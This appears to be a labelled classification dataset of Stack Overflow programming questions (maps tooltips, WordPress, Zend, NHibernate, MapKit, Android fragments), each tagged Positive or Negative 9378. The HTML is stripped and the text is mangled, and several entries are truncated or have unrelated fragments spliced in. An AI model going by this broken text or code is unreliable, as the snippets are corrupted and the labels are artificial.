Positive 9378 pTLDR How can I create the text for hoverover tooltips on google maps on the fly just as they are hoveredoverp  pMore detailp  pIm making google maps markers in what I think is the usual wayp  precodevar mar  new google.maps.Marker   positionloca.loc,   mapmap,   titleformatTitledata[i],   iconireturnColorsloca.lang10.png   codepre  pBut Im stuck because my map is in more than one language, so I want to display the tooltip in language A or language B based on a setting in the page.  Ive been able to configure all my other stuff for example, InfoWindows, etc by simply setting callbacks and at the moment when the display is called, I see which langauge were using and I show the appropriate text.p  pThe thing is that I want my hoverover tooltips titles to be in either langauge too.  Nevertheless, I havent figured out what callback if any is getting triggered when a tooltip gets displayed.  As Ive written the code above, the marker gets created when the map loads and the tooltip along with it.  I want some way to generate the tooltiptitle on the fly as the hoverover occurs.p  pThanks for any tipsp  pEDITp  pOne commenter downvoted the question without knowing the answer so that seems a little weird and made me think that perhaps Im not being specific enough.p  pSome event fires in the browser code to indicate that its time to display the tooltip at suchandsuch coordinates.  I want to override that event, if necessary.p  pClearly theres some code somewhere which dislays that text, I want to find that code and potentially override it.p  pHopefully that helps clarify what Im asking.  I dont need it to be a method in the google.maps. class hierarchy, I just need to be able to display the text dynamically.p  pPerhaps some other hoverovertooltip is the way to go, Ive done this some years ago with CSS pseudoclasses but surely theres some modern approach someone can recommend.p

So far I only found solutions that show the entire text inside the row.p  pThanksp

Positive 9378 pSo, I have that WordPress website on which I installed a template Zoo. My problem is that I want the whole site to be in French, and there are three buttons in that template which codetitlecode tag is coded deep in a js file that is inside a plugin which has been integrated to the template.p  pThese are my first steps as a web developer I come from C and Im having quite a hard time understanding what is missing in the files, but I understood a few things by looking around.p  pSo I made a child theme. This is the functions.php file. I think it works fine, but here it is in case I am doing it wrong p  precodeltphp function removethosedamntooltips     wpregisterscriptremovetooltips, getstylesheetdirectoryuri . jsremovetooltips.js     wpenqueuescript removetooltips   addactionwpenqueuescripts, removethosedamntooltips codepre  pThis is the aforementioned removetooltips.js file. I believe I have to call for a button hover because the template is singlepage parallax and the buttons I want to modify are not visible until you click another button which allows for another display without sending the browser to another URL if I remove line 2 and the closing brackets that go with it, it doesnt work anyway. Also, those tooltips appear only on mouse hover, so it seems a good idea p  precodejQuerydocument.readyfunction   alertjQuery   jQuerybutton.hoverfunction     alertjQuery     jQuery.mfparrowleft.attrtitle, Prcdent flche gauche     jQuery.mfparrowright.attrtitle, Suivant flche droite     jQuery.mfpclose.attrtitle, Fermer Esc     codepre  pThe first alert displays after the page is loaded, but the second one does not show up. The tooltips button title still show up in English.p  pA piece of information that might be useful to solve this problem Im only 2 days into reading stuff about JavaScript and jQuery so I dont really know I had to use codejQuerycode instead of codecode or the console would tell me that codecode is an unknown function. Do I need to somehow include the jQuery framework in my file if so, where and how , although a calling for the jQuery library already shows up in the header p  pIf you provide a solution that will remove the tooltips instead of replacing their content, I will be happy enough.p  pThank you in advance p

That target could be called once at the beginning right after branching of the development of a new release.p  pThen the project could build with the correct information when people would do a emgit cloneem of the project or when a release tarball is done. Of course one has to remember to run this make target when starting development of a new release.p  pAnother option would be to do the sedawk replacement with a hook for the dist target.But this would put the git repository of the project in a state were no correct version number is associated with the associated files.p  pI prefer doing the first solution as it also records the emcorrectem version number inside the git history. p  pWhen doing a sedawk replacement do you prefer doing it infile or with a template infile liek the autoconfautomake tools do.

Negative 9378 pDoes anyone know a way to take an image captured on the iphones camera, and do some image processing e.g. edge detection, skeletization, and then overlay parts of the processed image on the original image e.g. only the highlighted edges. p  pMore generically how do I create a UImage with transparency do I just scale the image and overlay it with an alpha value, does UIImage support transparency like gifs do.

Negative 9378 pI am integrating third party code into the web application I am writing in Zend Framework. p  pThe code I want to integrate declares variables as global. It works on its own, but not when I include it within Zend Framework. Initially I suspected that there is something in Zend Framework that is disabling the declaration of global variables. I have the following test code in a controllerp  precodepublic function testglobalAction     a  1    function b           global a       echo a2         b  codepre  pWhen I ran it prints out 0, as opposed to 2. On top of that running the same code on its own in the same web server prints out 2.p  pI understand that I could replace all the global instances to use Zend Registry. However, a grep showed me that there are roughly 700 lines I have to change, so it is not feasible at the moment.p  pDoes anyone know how I can solve this problemp

Negative 9378 pI am concerned with MITM attacks in the Silverlight application I am writing. The site will be running over SSL. If my site is the victim of a MITM attack, as far as I know, my only defense right now is the warning page the browser displays when the sites certificate is untrusted. Since it is only a browser, the best it can do is simply warn the user and then let them through anyway. Users can be click happy, and tend to not read things. Therefore, chances are they will read this warning, scratch their head, and continue on to the site. My thought was that since I am writing a robust Silverlight application, I should be able to either detect if the browser is seeing a certificate error, or perform that same verification that the browser performs. Then if I determine that there is a problem, I can simply lock down my entire app so that the user does not expose any critical information to the MITM. The problem that I am having is that I cant seem to find the right classes in Silverlights limited subset of .NET to do what I need to do. Does anyone know how I can accomplish this goal, or a different way around this issuep

Negative 9378 pI use custom model binder to bind OrderOrderItem in my actions. This model binder uses ServiceLocator.Current.GetInstance where ICart in turn depends on IOrderRepository not sure if this matters.p  pNow, everything works fine when I create first order item. And when I create the second one. Then I try to display the order which now contains two order items. This is done using p  precode  public ActionResult ShowOrder order  codepre  pwhere order is bound by my custom binder. I trace its BindModel and see, that after the call top  precode  order  cart.GetOrderid codepre  porder items are OK  i.e. I add the to Watch window, view properties, Products, and theyre all OK.p  pHowever, when the control flow comes to the ShowOrder order action method, the orders first item has invalid Products  accessing them results in following error the famous onep  pNHibernate.LazyInitializationException Initializing [Orders.Core.OrderItem5440c233fb7e4dc98aec9c8c0115808b]failed to lazily initialize a collection of role Orders.Core.OrderItem.Products, no session or session was closedp  pI can now see this in the Watch window when viewing order.Items[0].Products.p  pThe weird thing, is that the second order item is still OK So if it goes likep  ul liHTTP request ...

As I said Ive verified it is NOT get called between order is OK and order is not.p  pUpdate I wonder if this can be because of additional manual transaction around orderRepository.Saveorder.

So its onetime issue.p  pWhats funny, theres no such bug if I dop  precodereturn RedirectToActionShow, Orders, new  order  item.Order  codepre  pSo its something with MvcContrib trying to deal with order in TempData, Id say... p  pI found that I have this on controllersp  precode   [PassParametersDuringRedirect]    public class OrdersController codepre  pand thought that my order parameter comes from TempData instead of ModelBinder... though model binder did fire, too.

Negative 9378 pI need to build a rulebased system that can be run and developed in both C and Java for a chemistry application. The system needs to be able to get computed properties of objects through existing libraries and make decisions on those values. I am not sure what the system will look like but the rules need not be formally consistent we use a lot of heuristics. As far as possible the rules should be externalised so users and developers can modify them without needing to know about the engine which should be Open Source and run on both platforms. Its possible that the system will be run through a restricted set of naturallanguagelike commands. There will be an element of adaptation  new objects or at least vocabulary can be added.p  pThis is not as hairy as it sounds  a great deal of progress was made over 30 years ago using FORTRAN but the field has lain fallow. Id be grateful for pointers to approaches we could experiment with where the overhead of entry was modest. Among the approaches that might work arep  ol liPrologli liOWL Ontologiesli liDecision treesli liRULEMLli liTextbased gamesli ol  pstrongEDITstrong strongThe primary aspect of the question is to find a rulebased systemstrong the Java C mention is secondary and was simply to prevent answers that might say Windows has a builtin system.

So far only one or two answers really addresses the rules aspect.p

Negative 9378 pIm currently working with the mapkit and am stuck.p  pI have a custom annotation view I am using, and I want to use the image property to display the point on the map with my own icon. I have this working fine. But what I would also like to do is to override the default callout view the bubble that shows up with the titlesubtitle when the annotation icon is touched. I want to be able to control the callout itself the mapkit only provides access to the left and right ancillary callout views, but no way to provide a custom view for the callout bubble, or to give it zero size, or anything else.p  pMy idea was to override selectAnnotationdeselectAnnotation in my codeMKMapViewDelegatecode, and then draw my own custom view by making a call to my custom annotation view. This works, but only when codecanShowCalloutcode is set to codeYEScode in my custom annotation view class. These methods are NOT called if I have this set to codeNOcode which is what I want, so that the default callout bubble is not drawn. So I have no way of knowing if the user touched on my point on the map selected it or touched a point that is not part of my annotation views delected it without having the default callout bubble view show up.p  pI tried going down a different path and just handling all touch events myself in the map, and I cant seem to get this working. I read other posts related to catching touch events in the map view, but they arent exactly what I want. Is there a way to dig into the map view to remove the callout bubble before drawing Im at a loss.p  pAny suggestions Am I missing something obviousp

Negative 9378 pIm designing my first database for MySQL and the idea here is that we have orders that can contain multiple different items.  So i decided to store order with all the relevant info in one table, items in another, and then create a third table where each ordered item is stored. Of course every time i will need to list an order i first will have to find every OrderedItemsID for which OrderID is the same as the OrderID i need and than match that to items.p  pNow since this is my first DB design im not arrogant enough to think that its a good solution, so i was wondering if anyone knows a good solution for this sort of problem Thanksp  pimage is at a hrefhttpimg211.imageshack.usimg2115575stackoverflowq.png relnofollowhttpimg211.imageshack.usimg2115575stackoverflowq.pngap

Negative 9378 pWhen constructing a lexertokenizer is it a mistake to rely on functionsin C such as isdigitisalpha...  They are dependent on locale as far as I know.

Do I produce one lexertokenizer for each character set or do I try to code the one I wrote so that the only thing I have to do is change the character mapping. What are common practicesp

Negative 9378 pI would like to create a UIView has multiple UITextFields validates each one as the user is done editing it.  The view controller is the delegate for each of the UITextFields.  When a user changes a value in one of those UITextFields and either touches done on the keyboard or touches on another one of the textfields in the view, I save and validate the change.  The idea here is to give the user immediate feedback, and not allow himher to proceed any further if there an invalid attribute value has been entered.p  pI have read the a hrefhttpdeveloper.apple.comiphonelibrarydocumentationStringsTextFontsConceptualTextAndWebiPhoneOSManageTextFieldTextViewsManageTextFieldTextViews.html relnofollowText and Web Programming Guidea on Apples support docs, which suggested that I put the savevalidation logic in codetextFieldShouldEndEditingcodep  blockquote   pThe best delegation methods for validating entered strings are textFieldShouldEndEditing for text fields and textViewShouldEndEditing for text views. These methods are called just before the text field or text view resigns first responder status. Returning NO prevents that from happening, and consequently the text object remains the focus of editing. If an entered string is invalid, you should also display an alert to inform the user of the error.p blockquote  pSo to test this out, I created a simple project with one UIView and two UITextFields.  Per the docs, all I do in this test project is display a UIAlertView and return NO.

The strange part is that access is working correctly providing the correct results for the query while when trying to execute the new stored query on asp.net i get an Undefined function DConcat in expression error. i know that my query is working correctly since i get the right results every time i execute it in access but i get the problem described above when i try to get the results through an asp.net web page i have created.i would really appreciate any help on the matter since i cant find a lot of information regarding the subject online.p  pthank you in advancep

Negative 9378 pSo Im starting to work with the new workflow enginge Windows Workflow Foundation 4  WF 4 after previously working with 3.5.  And I must say it is greatly improved  However, now I am trying to port over some existing workflows to WF 4 and have ran into some snags as is always the case.p  pSo my main problem is that in WF 3, it was all interface based and the workflow runtime was responsible for linking interfaces and implentations on the application start and the workflows themselves never had an instance of an object when it serialized itself to the database, which is exactly what I want because I never want my data services to be serialized. p  pNow in WF 4, I seems like I need to pass the data services as an argument to the workflow, so when it gets persisted to the database, it serializes the variables as well. These are long running workflows that have approval steps and such, so I need to persist the workflow when idle.  p  pAm I missing something, maybe thinking in the old WF 3 mentaility Or is there a pattern I can use to do thisp

Negative 9378 pI would like to now how those instructions are allocating memory.p  pFor example what if I got codep  precodex  new int[5]  y  new int[5] codepre  pIf those are allocated how it actually looks like in RAM Is whole block reserved for each of the variables or blockmemory page or howyoucallit  4KB of size on 32bit is shared for 2 variablesp  pI couldnt find answer for my question in any manual. Thanks for all replies.p  pI found on wikipedia Internal fragmentation of pages Rarely do processes require the use of an exact number of pages. As a result, the last page will likely only be partially full, wasting some amount of memory. Larger page sizes clearly increase the potential for wasted memory this way, as more potentially unused portions of memory are loaded into main memory. Smaller page sizes ensure a closer match to the actual amount of memory required in an allocation. As an example, assume the page size is 1024KB. If a process allocates 1025KB, two pages must be used, resulting in 1023KB of unused space where one page fully consumes 1024KB and the other only 1KB.p  pAnd that was answer for my question. Anyway thanks guys.p

Negative 9378 pIn the guts of OAuth I discover the field codeoauthtimestampcode, for which the specified behavior is apparently that all requests that contain a lower codeoauthtimestampcode value than the highest one ever received should be denied.  As I am trying to queue up a number of Twitter API requests for processing, and potentially outofgeneratedorder processing for that matter, this nasty little item may really ruin my day.p  pBut, Twitter being Twitter, there is hope the possibility that they have never actually written code to enforce the specified behavior of codeoauthtimestampcode.  Which would be lovely, since I object to it violently.p  pSo, does anybody happen to know whether the Twitter API actually enforces codeoauthtimestampcodes specified behaviorp

Negative 9378 pI have a UserControl Ive written to display a few properties from a custom object.  There are multiple instances of these objects so I have an ObservableCollection of them so I can set them as an ItemsSource binding to a ListView.  Now I can get an instance of this UserControl show up for each instance of my class in my ListView.p  pThe problem is I dont really want the behavior of a ListView.  I dont want the user to be able to select the entire UserControl.  In fact, the user should be able to select individual elements in the UserControl.p  pI thought about just using a StackPanel to put these UserControls in, but it doesnt have an ItemesSource property.  Is there an easy way to make this happenp

The view files are rendered in HTML and then sent to the client that does some js treatments on it like attaching events.p  pThis way of working seems strange to me, as it separates the view between the server side and the client side.p  pI was thinking about moving all the View treatments to the client part that will build dynamically its html in js. The server side will then send only raw data.p  pI worked this way on smaller projects, and I was really happy with the result easily understandable, portable and reusable.p  pIs it a right way to implement an MVC app  Any advices around that reflexion p

Negative 9378 pWeve used php to build up an interface that the client can upload svg graphic, then click the button to do an XSLT transform.p  pThe interface and underlying XSLT worked perfectly fine previously, until recently, the xslt process will always fail and return error like could not find www.w3.org or sth Cannot remember quite exactly.p  pOur client uses Adobe Illustrator to create SVG graphics, and then use our tool to do the transform, and the SVG graphics that directly come out of Adobe Illustrator has the following three lines on the top of every SVG filep  precodeltxml version1.0 encodingutf8gt lt Generator Adobe Illustrator 15.0.0, SVG Export PlugIn . SVG Version 6.00          Build0  gt ltDOCTYPE svg PUBLIC W3CDTD SVG     1.1EN httpwww.w3.orgGraphicsSVG1.1DTDsvg11.dtdgt codepre  pWe did some research and we came to conclustion that w3.org is blacklisting our clients server Windows Server 2003. The normal workaround is to do a resolver. Since the client will only give us 1 hour or so to do the remote control on their stuff, so I am thinking if there is a simpler way to handle this issue.p  pOne proposed way is we could place a flatfile.dtd on client server, so every incoming SVG file can reference that, and we use the php to manipulate the SVG file, scan the file until it finds the codeltDOCTYPE..code string, then replace the whole string with another codeltDOCTYPE..code in which the url is now pointing the local flatfile.dtd, save the file and then begin the XSLT process. Then after the translation, we do the reverse process, which is to reset the dtd url from our local dtd to the default w3.org one.p  pI will try do this tomorrow, and our demo is on Friday. So I am just seeking some advice here if this way is realisitic and has it any risks Or, could any experts give some better alternatives to deal with this issuep  pThanks in advance.p

Negative 9378 pI am trying to modify a current MFC application running on Windows NT4 to use boost libraries for ethernet communcications originally, it used CommX for serial and general increased performance, effieciency, and clarity of code.p  pI started out modifying it in VS2010, but I found that I was unable to produce a valid NT4 app with VS2010. I googled the issue and found that VS2005 was the last version able to create an NT4 app. I got everything to compile in VS2005, but found that I had to change certain define statements in stdafx.h in order to get the app to run on NT4. However, even after doing that, when I execute the program on NT4, it immediately quits with no error. It doesnt show anything. I even checked the Task Manager processes while executing it. It is like it never executed at all.p  pI got desperate and tried compiling the app in VS2003, but I got so many errors that I gave that up.p  pMy last attempt was VC6, but again, I got 262 errors and started wondering whether it was even possible for boost to run in VB6 or on an NT4 machine.p  pIs it even possible to compile and run an MFC app with boost libraries on an NT4 machine If so, which environmentcompiler do I need and how do I configure it to work correctlyp  pThis is a very tightschedule project, so any prompt help would be very appreciated Thank you p

Negative 9378 pOk, so this is going to be long, and may be confusing.  I am using Xcode 4 w iOS SDK 4.3p  pI will describe my scenario, and what I need.  I am fairly new to ObjectiveC, but I do understand basic concepts etc. I am not asking for someone to do this for me, I am simply asking for some help with how I should go about starting, doing certain things, and making it work smoothly.p  pI will try and explain what I need in most detail, to prevent confusion. I am truly sorry if this is lengthly, and I appreciate any help whatsoever. I have been struggling with this for a good week now. I have a tabbased iPhone application, and the first tab is a Welcome page. I need a firsttime use page, which will appear if only it is not filled out. I will now simply list what I am trying to do.p  pIf the user has not filled out the setup page yet, modally display it after application launch. For simplicity, I will refer to the firstsetup page as ModalSetup1 On ModalSetup1, there are 2 segmented controllers, and one switch. p  pThe first has 5 options, and the different options are 8,9,10,11,12.br The second segmented control has 2 options, they will have text labels, but I am not sure how I am going to implement this string or int.br The switch is an optional selection to do another part in the setup.  If selected, the done button at the top right of the screen will change to a Next button, and when you hit Next, it will take you to another part of the setup ModalSetup2, instead of closing, which it would do if the switch was set to off.p  pimg srchttpi.imgur.comCnsQ8.png altHere is the first picture, as I can not directly post images yet.p  pNow, there is another part which might even get more complicated, but I will explain that later ModalSetup2.  I dont even know if you can display 2 different views modally What I need is the segmented controller options to be saved, and be able to be retrieved from other tabsviews. The settings wont actually display on the other Views, but it will actually tell the other views to act. Use an If Statementp  pIf I could get an answer to tell me what direction I should be going in, that would be amazing.  I am asking for a lot, and I am aware of that. p  pNow, this part is the next section in the setup.  It is ModalSetup2. There are 8 buttons, and when each button is hit, I need a picker to be displayed similarly to how a keyboard is displayed.  All 8 of these pickers will display the same content, but each is individual as they are each different, and I need a selection from each one. In the pickers, it needs to display 3 columns.  Once the user has completed filling out the pickers, they will hit done, and all of the data will be saved, and should be able to be pulled and used in other views of my App.p  pimg srchttpi.imgur.com69dm4.png altHere is the second picture.p  pI must thank you for reading my entire post, I understand that it is a lot of content, but I dont know where to begin at this point.  I am having trouble with pulling the data that is selected currently saved via NSUserDefaults and displaying it on another view.  Another problem I am having is switching to another view Modally, while still being able to switch back to my original view.p  pThanks again, this means a great deal to me.p  pIf you need any more info, just let me know.  I am adding pictures in right now, so please be patient.p

Negative 9378 pIve got a Python script that sometimes displays images to the user. The images can, at times, be quite large, and they are reused often. Displaying them is not critical, but displaying the message associated with them is. Ive got a function that downloads the image needed and saves it locally. Right now its run inline with the code that displays a message to the user, but that can sometimes take over 10 seconds for nonlocal images. Is there a  way I could call this function when its needed, but run it in the background while the code continues to execute I would just use a default image until the correct one becomes available.p

Negative 9378 pIm trying to create a simple .jar file out of my project. The project is made of two .class files  the main class which uses the secondary class to generate a GUI. The main class is the actual main class that runs while the second class is just a class file with its methods and its also an emextensionem of JFrame and imports javax.swing and java.awt.event..p  pI use Jar to bundle it all up. I add a manifest file with a new line character which points to the primary file with the main method. The Jar file thus has two .class files and a folder with the manifest.txt in it. When I use javaw.exe to run it, nothing happens at all. So I try to run it in the command line and I get a NoClassDefFroundError about the secondary class.p  pI noticed I get the same kind of error when I try to compile and run the second class in JCreator  no wonder, it doesnt have a main method, its just a class file. When I run the main file from JCreator, everything works fine.p  pAny ideasp

Negative 9378 pI am developing an Android app for tablets and strongnotstrong using the compatibility library.p  pThere is just one Activity and it uses the ActionBar with 3 tabs.

Also, I am not using attachdetach since those were just added in API 13. p  pMy theory is that either setContentView hasnt finished creating the views, and thats why FragmentTransaction cant add them, OR the fragments are being added for one tab when another tab is selected and setContentView is called, destroying the other set of views. p  pI tried to hack something in to slow down tab switching but didnt get anywhere. p  pHere is the code for my TabListenerp  precodeprivate class BTabListenerltT extends Fragmentgt implements ActionBar.TabListener      private int mLayout     private Fragment[] mFrags     private TabData mTabData     private Activity mAct     private boolean mNoNewFrags       public BTabListenerActivity act, int layout, TabData td, boolean frags         mLayout  layout         mTabData  td         mAct  act         mNoNewFrags  frags          mFrags  new Fragment[mTabData.fragTags.length]         forint i0 iltmFrags.length i             on an orientation change, this will find the fragments that were recreated by the system             mFrags[i]  mAct.getFragmentManager.findFragmentByTagmTabData.fragTags[i]                     Override     public void onTabReselectedTab tab, FragmentTransaction ft             Override     public void onTabSelectedTab tab, FragmentTransaction ft          this gets called after unselected         note unselected wont have been called after an orientation change         we also need to watch out because tab 0 always gets selected when adding the tabs          set the view for this tab         mAct.setContentViewmLayout          forint i0 iltmFrags.length i             this will be null when the tab is first selected             ifmFrags[i]null                  mFrags[i]  Fragment.instantiateGUITablet.this, mTabData.classes[i].getName                                               if there was an orientation change when we were on this page, the fragment is already added             ifmNoNewFrags  mDefaultTabtab.getPosition                 ft.addmTabData.containterIDs[i], mFrags[i], mTabData.fragTags[i]                               mNoNewFrags  false             Override     public void onTabUnselectedTab tab, FragmentTransaction ft           this gets called when another tab is selected, before its onSelected method           forFragment f  mFrags             try extra safety measure                 ft.removef             catchException e                 e.printStackTrace                 System.out.printlnunselect couldnt remove                              codepre  pAnd finally, the stack tracep  precode0929 015308.200 ERRORAndroidRuntime4611 java.lang.IllegalArgumentException No view found for id 0x7f0b0078 for fragment Fraggle40ab2230 2 id0x7f0b0078 dummy2 0929 015308.200 ERRORAndroidRuntime4611     at android.app.FragmentManagerImpl.moveToStateFragmentManager.java729 0929 015308.200 ERRORAndroidRuntime4611     at android.app.FragmentManagerImpl.moveToStateFragmentManager.java926 0929 015308.200 ERRORAndroidRuntime4611     at android.app.BackStackRecord.runBackStackRecord.java578 0929 015308.200 ERRORAndroidRuntime4611     at android.app.FragmentManagerImpl.execPendingActionsFragmentManager.java1226 0929 015308.200 ERRORAndroidRuntime4611     at android.app.FragmentManagerImpl1.runFragmentManager.java374 0929 015308.200 ERRORAndroidRuntime4611     at android.os.Handler.handleCallbackHandler.java587 0929 015308.200 ERRORAndroidRuntime4611     at android.os.Handler.dispatchMessageHandler.java92 0929 015308.200 ERRORAndroidRuntime4611     at android.os.Looper.loopLooper.java132 0929 015308.200 ERRORAndroidRuntime4611     at android.app.ActivityThread.mainActivityThread.java4028 0929 015308.200 ERRORAndroidRuntime4611     at java.lang.reflect.Method.invokeNativeNative Method 0929 015308.200 ERRORAndroidRuntime4611     at java.lang.reflect.Method.invokeMethod.java491 0929 015308.200 ERRORAndroidRuntime4611     at com.android.internal.os.ZygoteInitMethodAndArgsCaller.runZygoteInit.java844 0929 015308.200 ERRORAndroidRuntime4611     at com.android.internal.os.ZygoteInit.mainZygoteInit.java602 0929 015308.200 ERRORAndroidRuntime4611     at dalvik.system.NativeStart.mainNative Method codepre  pTHANK YOUp
Negative 9378 pIm developing an app that will store MLS Multiple Listing Service Property Listings from several different MLSs. The majority of my customers will only use one MLS, however, some will use mutliple MLSs. My question is What is the best method to setup the tables Lets say I have 50 different MLSs. Each MLS will have roughly 80k records and 100 fields. Should I put all listings into a single table and reference by an MLSID or should I create a new table for each MLS Each MLS will always have the same field names and datatypes.p  pI would think that putting each MLS into its own table would be best for performance, but not for scalability. If I were to put all records into a single table, how much do you think that would effect the performance Im also thinking a single table may be better because when the customer uses multiple MLSs, I can pull from a single table rather than multiple tables. Thoughts or ideasp
Negative 9378 pAs a toy example, suppose that we have a function called myfunc the code is below that takes two parameters n and p. Our function, myfunc, will generate a random matrix x with n rows and p columns and do something expensive in both runtime and memory usage, such as computing the sum of the singular values of x. Of course, the function is a oneliner, but I am shooting for readability here.p  precodemyfunc lt functionn, p    x lt replicatep, rnormn   sumsvdxd  codepre  pIf we wish to compute myfunc for several values of n, and for each value of n we have several values of p, then vectorizing the function and then applying it the combinations to myfunc is straightforwardp  precoden lt 10  seqlen5 p lt 100  seqlen10 grid lt expand.gridn  n, p  p myfunc lt Vectorizemyfunc set.seed42 do.callmyfunc, grid [1]   98.61785  195.50822  292.21575  376.79186  468.13570  145.18359 [7]  280.67456  421.03196  557.87138  687.75040  168.42994  340.42452 [13]  509.65528  683.69883  851.29063  199.08474  400.25584  595.18311 [19]  784.21508  982.34591  220.73215  448.23698  669.02622  895.34184 [25] 1105.48817  242.52422  487.56694  735.67588  976.93840 1203.25949 codepre  pNotice that each call to myfunc can be painfully slow for large n and p try n  1000 and p  2000 for starters.p  pNow, in my actual application with a similarly constructed function, the number of rows in grid is much larger than given here. Hence, I am trying to understand vectorizing in R a little better.p  pFirst question In the above example, are the calls to myfunc performed sequentially so that the the memory usage in one call is garbage collected before the next call I use vectorization often but have never stopped to ask this question.p  pSecond question This question may depend on the first Assuming that the number of calls is large enough and that myfunc is slow enough, is parallelization warranted here I am presuming yes. My strongrealstrong question is is parallelization warranted here if instead myfunc had the same large matrix passed to it for each call For sake of argument, assume the matrix is called y, has 1000 rows and 5000 columns and is calculated onthefly. Of course, passing the matrix y to each of the parallel nodes will incur some lag.p  pI understand that the answer to the second question may be It depends on...

If I replugin the device and select my Activity as Intent receiver, it works fine.

Negative 9378 pSo Im have a terrible time dealing with my default.png images for my recently created app.  This seems like the easiest part of building an app, so my difficulty with it makes me feel extra dumb P  Im doing a phonegap app, but I dont think that has anything to do with this issue.  I have two apps with similar issues.p  pstrongFIRST APPstrong The first one is a universal app meaning it runs on iphones and ipads, so it has default.png images for both ipad and iphone resolutions.  It opens immediately with the correct ipad size.  Then, very quickly, it shows the iphone sized one in the bottom left with my home screen showing in the background.  Once the app is fully done loading, the iphone default.png image goes away and everything is fine.

Negative 9378 pIm trying a solve an exercise from Exploring Python book. But, I guess I dont understand concept of the recursion. Ive written some Recursively function. Therefore I know some of the aspects. But, I dont have enough experience. And Ive stopped to study programming about one year.p  pAnyway, let me give you the full questionp  blockquote   pA polygon can be represented by a list of x, y pairs where each pair   is a tuple [ x1, y1, x2, y2, x3, y3 , ... xn, yn]. Write a   recursive function to compute the area of a polygon. This can be   accomplished by cutting off a triangle, using the fact that a   triangle with corners x1, y1, x2, y2, x3, y3 has area x1y1    x2y2  x3y2  y1x2 y2x3  y3x1  2.p blockquote  pDespite the fact that, the question already gave the formula, I used another formula.

Negative 9378 ol liFirst time postingli liFirst time writing in JavaScript, though I have experience in other languages.li ol  pIm working in Adobe InDesign CS5.5. I have multiple files in an ID Book, each containing a varying number of chapters. The book includes an index file with topic headings that reference the chapters in an abbreviated form e.g., CHAPTER 125 becomes ch 125 no 3  note the no x part is irrelevant. The goal of my script is to create interdocument links that will add significant functionality when the ID Book is exported to, say, a PDF. The user will be able to jump from index to chapter and viceversa. I think the script and the issues Im dealing with would be of use to others but havent found any posts to address my problem yet.p  pAll refs like ch 125 no 1 in the index to a particular chapter CHAPTER 125 get a hyperlink to the location of the head of that chapter. This part of the script is working great and runs quickly.p  pThe other half will insert the corresponding topic headings at the end of each chapter text and make those paragraphs link back to the corresponding topic head in the index. In other words, they are cross references but not true xrefs in ID terms because I wanted more control over them and my reading on the topic told me to steer clear of true xrefs. This is the part of the script that has me banging my head on the wall. It runs for hours upon hours without finishing a book of 200 chapters. Note that for testing purposes I am simply inserting one paragraph of text in the desired location under each chapter, rather than all topic heads and links. I know from smaller sets of text and from my debugging prints to the console that the script is doing work, not stuck in an infinite loop. Nevertheless, it runs way too long and, if I interrupt it, InDesign is unresponsive and I have to kill it, so cannot even review the partial results.p  pBased on searchingreading forums  I have disabled preflighting disabled auto updating of book page numbers changed the live preview settings to delayed. I still suspect the slowness may have to do with InDesign overhead but I dont know what else to try.p  pIm embarrassed at how awful the style of this JS code might be but at the moment I just need it to work, then I can refine it.p  precodevar myBookFilePath  File.openDialogChoose an InDesign Book File, Indb files .indb var myOpenBook  app.openmyBookFilePath app.scriptPreferences.userInteractionLevel  UserInteractionLevels.neverInteract   Open up every file in the currently active Book app.openapp.activeBook.bookContents.everyItem.fullName   TODO  add error handling  user interaction here  to pick which is Index file var strIndexFilename  Index.indd var objChapHeadsWeb   var myDoc  app.documents.itemstrIndexFilename  .writelnnn   myDoc.name      REMOVED CODE  check for existing hyperlinks, hyperlink sourcesdestinations  loop to delete any preexisting hyperlinks amp associated objects  works wo any problems   Ugly GREP to find the Main heading text all caps entry and nothing beyond in the index file app.findGrepPreferences  NothingEnum.nothing app.changeGrepPreferences  NothingEnum.nothing   GREP  [ud amp,.][ud]., app.findGrepPreferences.findWhat  [ud amp,.][ud]., app.findGrepPreferences.appliedParagraphStyle  Main  var myFound  [] myFound  myDoc.findGrep .writelnFound   myFound.length   Main headings.  for var i  0 i lt myFound.length i        myDoc.hyperlinkTextDestinations.addmyFound[i],  name myFound[i].contents    .writelnThere are now   myDoc.hyperlinkTextDestinations.count   destinations.   myFound.length  0  for var j  app.documents.count1 j gt 0 j      app.findGrepPreferences  NothingEnum.nothing     app.changeGrepPreferences  NothingEnum.nothing       set the variable to the document we are working with     myDoc  null     myDoc  app.documents[j]     myFound.length  0      if myDoc.name  strIndexFilename          continue        we dont want to look for chapter heads in the Index file, so skip it           .writelnnn   myDoc.name      REMOVED CODE  check for existing hyperlinks, hyperlink sourcesdestinations  loop to delete any preexisting hyperlinks amp associated objects  works wo any problems       Clear GREP prefs     app.findGrepPreferences  NothingEnum.nothing     app.changeGrepPreferences  NothingEnum.nothing      app.findGrepPreferences.findWhat  CHAPTER d     app.findGrepPreferences.appliedParagraphStyle  chapter      myFound  myDoc.findGrep     var strTemp       .writelnFound   myFound.length   chapter headings.      for var m  0 m lt myFound.length m            strTemp  myFound[m].contents          objChapHeadsWeb[strTemp]           objChapHeadsWeb[strTemp].withinDocName  myDoc.name         objChapHeadsWeb[strTemp].hltdChHead               myDoc.hyperlinkTextDestinations.addmyFound[m], namestrTemp         objChapHeadsWeb[strTemp].astrIxMains  []         objChapHeadsWeb[strTemp].ahltdIxMains  []         objChapHeadsWeb[strTemp].nextKeyName            objChapHeadsWeb[strTemp].nextKeyName               m lt myFound.length1  myFound[m1].contents  String           .writelnThere are now   myDoc.hyperlinkTextDestinations.count   destinations.

Negative 9378 pHeres what I want to do. I have a big xml file there are a lot of daily records... lets say for every 3 hours there are some production records pieces, scrap and so on. Now... I parse this XML in jQuery and I want to put the data in a jqGrid then show it as a chart with highcharts. The problem is that I dont want to show every record... just the daily results or weekly or monthly so what I need is to sum up all those 3 hour reports by date or by week or by month. I know how to do it... but since there are a lot of records looping through the xml multiple times is not the best idea. So... is there any jquery function or something that will help me do this task more efficient Or easier Thanks If you didnt understand what I want please ask and Ill add more details.p

Negative 9378 pIm working on a treestructured storage and we currently use transaction methods to modify the treestructure. I always thought using the Command Pattern would be appropriate.

Otherwise we could even do moves between without the cumbersome p  precodewtx.methodwtx.methodwtx.method codepre  pHowever I thought about the command pattern which would be p  precodenew InsertTextEInsert.ASRIGHTSIBLING, value.executewtx new InsertElementEInsert.ASRIGHTSIBLING, new QNamebla.executewtx ... codepre  pwhich is a bit more verbose but well, it would support the openclosed principle which is really nice.p  pSo, what do you thinkp

